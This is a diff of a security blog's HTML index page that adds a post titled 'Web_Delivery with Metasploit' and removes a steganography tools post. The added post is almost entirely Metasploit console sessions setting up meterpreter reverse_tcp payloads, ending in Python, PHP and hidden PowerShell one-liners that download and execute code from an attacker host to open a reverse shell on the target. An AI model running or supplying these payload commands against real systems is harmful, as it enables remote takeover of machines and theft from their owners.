@@ -230,27 +230,12 @@
   
     <div class="site-search">
       
-  
-  <div class="algolia-popup popup">
-    <div class="algolia-search">
-      <div class="algolia-search-input-icon">
-        <i class="fa fa-search"></i>
-      </div>
-      <div class="algolia-search-input" id="algolia-search-input"></div>
-    </div>
-
-    <div class="algolia-results">
-      <div id="algolia-stats"></div>
-      <div id="algolia-hits"></div>
-      <div id="algolia-pagination" class="algolia-pagination"></div>
-    </div>
-
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-  </div>
-
-
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
 
 
     </div>
@@ -268,6 +253,124 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/10/14/Web-Delivery-with-Metasploit/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/10/14/Web-Delivery-with-Metasploit/" itemprop="url">
+                  Web_Delivery with Metasploit
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-14T12:13:27+08:00">
+                2016-10-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-Python"><a href="#0x01-Python" class="headerlink" title="0x01 Python"></a>0x01 Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Python</span><br><span class="line">   1   PHP</span><br><span class="line">   2   PSH</span><br><span class="line">msf exploit(web_delivery) &gt; set target 0</span><br><span class="line">target =&gt; 0</span><br><span class="line">msf exploit(web_delivery) &gt; set payload python/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:4444</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/c2pZ0n9EZ</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/c2pZ0n9EZ</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">python -c &quot;import urllib2; r = urllib2.urlopen(&apos;http://111.111.111.111:8080/c2pZ0n9EZ&apos;); exec(r.read());&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="0x01-PHP"><a href="#0x01-PHP" class="headerlink" title="0x01 PHP"></a>0x01 PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 1</span><br><span class="line">target =&gt; 1</span><br><span class="line">msf &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 111.111.111.111:8081</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1G1wlPGJjES4k3</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/1G1wlPGJjES4k3</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">php -d allow_url_fopen=true -r &quot;eval(file_get_contents(&apos;http://111.111.111.111:8080/1G1wlPGJjES4k3&apos;));&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Window-PowerShell"><a href="#0x03-Window-PowerShell" class="headerlink" title="0x03 Window PowerShell"></a>0x03 Window PowerShell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf exploit(web_delivery) &gt; set target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(web_delivery) &gt; set LHOST 111.111.111.111</span><br><span class="line">LHOST =&gt; 111.111.111.111</span><br><span class="line">msf exploit(web_delivery) &gt; set LPORT 2333</span><br><span class="line">LPORT =&gt; 2333</span><br><span class="line">msf exploit(web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 111.111.111.111:2333</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/5Yk82s</span><br><span class="line">msf exploit(web_delivery) &gt;</span><br><span class="line">[*] Local IP: http://111.111.111.111:8080/5Yk82s</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following command on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -c $D=new-object net.webclient;$D.proxy=[Net.WebRequest]::GetSystemWebProxy();$D.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $D.downloadstring(&apos;http://111.111.111.111:8080/5Yk82s&apos;);</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
     
       
 
@@ -1944,139 +2047,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/03/Steganography/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/09/03/Steganography/" itemprop="url">
-                  Steganography
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-03T22:27:07+08:00">
-                2016-09-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; copy /b 1.jpg+1.rar new.jpg</span><br></pre></td></tr></table></figure>
-<h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; binwalk zip.jpg</span><br></pre></td></tr></table></figure>
-<h3 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a><a href="http://www.caesum.com/handbook/Stegsolve.jar" target="_blank" rel="external">Stegsolve</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stegsolve.jar</span><br></pre></td></tr></table></figure>
-<h3 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; exiftool 1.jpg</span><br></pre></td></tr></table></figure>
-<h3 id="MP3Stego"><a href="#MP3Stego" class="headerlink" title="MP3Stego"></a><a href="http://www.petitcolas.net/fabien/software/MP3Stego_1_1_18.zip" target="_blank" rel="external">MP3Stego</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line">&gt; decode -X -P pass svega_stego.mp3</span><br></pre></td></tr></table></figure>
-<h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; binwalk carter.jpg</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">382           0x17E           Copyright string: &quot;Copyright (c) 1998 Hewlett-Packard Company&quot;</span><br><span class="line">3192          0xC78           TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">140147        0x22373         JPEG image data, JFIF standard 1.01</span><br><span class="line">140177        0x22391         TIFF image data, big-endian, offset of first image directory: 8</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; dd if=test.jpg of=test.jpg skip=140147 bs=1</span><br></pre></td></tr></table></figure>
-<h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; foremost</span><br></pre></td></tr></table></figure>
-<h3 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h3><blockquote>
-<p>mp4</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg 1.mp4</span><br></pre></td></tr></table></figure>
-<h3 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a>pngcheck</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; pngcheck -vv 1.png</span><br></pre></td></tr></table></figure>
-<h3 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h3><blockquote>
-<p>python来写zlib解压,zlib开头是以78 9C开头</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">import zlib</span><br><span class="line">import binascii</span><br><span class="line">IDAT = &quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;.decode(&apos;hex&apos;)</span><br><span class="line">#print IDAT</span><br><span class="line">result = binascii.hexlify(zlib.decompress(IDAT))</span><br><span class="line">print result</span><br><span class="line"> </span><br><span class="line">#print result.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2122,7 +2092,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">69</span>
+              <span class="site-state-item-count">70</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -2132,7 +2102,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">55</span>
+                <span class="site-state-item-count">56</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
@@ -2515,19 +2485,6 @@
   
 
   
-
-  
-  
-  
-  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
-
-  
-  
-  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
-  
-
-  <script src="/js/src/algolia-search.js?v=5.1.0"></script>
-
 
 
 </body>
